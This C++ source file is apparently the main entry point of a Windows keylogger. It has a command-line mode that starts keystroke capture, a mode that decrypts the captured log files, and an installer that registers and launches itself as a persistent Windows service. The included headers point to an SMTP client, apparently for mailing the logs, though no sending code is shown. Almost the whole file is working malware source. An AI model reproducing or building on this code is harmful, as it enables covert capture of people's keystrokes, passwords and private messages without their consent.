//  Service.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "CSmtp.h"
#include "KeyLogManager.h"
#include "ServiceManager.h"
#include "tlhelp32.h"
#include "Logger.h"
#include "SecurityTool.h"
#include "CompressTool.h"
#include "Service.h"

#include  <io.h>
#include  <stdio.h>
#include  <stdlib.h>

void service_main();
void installer_main();
void keylog_main();
void decrypt_main(char*);

KeyLogManager klm;

int WINAPI _tWinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPTSTR lpCmdLine,
	int nCmdShow
	){
		if(strcmp(lpCmdLine, "-k") == 0){
			Logger::debug("Keylog Mode");
			keylog_main();
			return 0;
		}
		if(strncmp(lpCmdLine, "-d ", 3) == 0 && strlen(lpCmdLine) > 3){
			Logger::debug("Decrypt Mode");
			decrypt_main(lpCmdLine + 3);
			return 0;
		}
		if(strlen(lpCmdLine) > 0){
			Logger::debug("Invalid Argument");
			return 0;
		}

		bool is_service = ServiceManager::is_service_env();
		if(is_service){
			Logger::debug("Service Mode");
			service_main();
		} else{
			Logger::debug("Installer Mode");
			installer_main();
		}
		return 0;
}

void keylog_main(){
	klm.init(GetCurrentThreadId());
	klm.start();
}

void decrypt_main(char* path){
	FILE* fp = fopen(path, "r");
	if(!fp){
		Logger::debug("Open %s Fail", path);
		return;
	}
	std::string wpath(path);
	wpath.append(".txt");
	FILE* wfp = fopen(wpath.c_str(), "w");
	if(!wfp){
		Logger::debug("Open %s Fail", wpath.c_str());
		return;
	}
	char buf[SecurityTool::B64_SIZE] = {0};
	while(fread(buf, sizeof(buf), 1, fp) > 0){
		std::string in(buf, sizeof(buf)), out;
		SecurityTool::decrypt(in, out, SecurityTool::KEY);
		fprintf(wfp, out.c_str());
	}

	fclose(fp);
	fclose(wfp);
}

void installer_main(){	
	char exe_path[MAX_PATH];
	DWORD size = GetModuleFileName(NULL, exe_path, sizeof(exe_path));
	exe_path[size] = 0;
	ServiceManager::uninstall(SERVICE_NAME);
	ServiceManager::install(exe_path, SERVICE_NAME);
	bool ret = ServiceManager::run(SERVICE_NAME);
	if(ret){
		Logger::debug("Service %s Install And Run Succ", SERVICE_NAME);
	} else{
		Logger::debug("Service %s Install And Run Fail", SERVICE_NAME);
	}
}

VOID service_main()
{
	//start serivce
	if(!Service::start_service()) {
		Logger::debug("StartServiceCtrlDispatcher failed, error code = %d\n", GetLastError());
	}
}
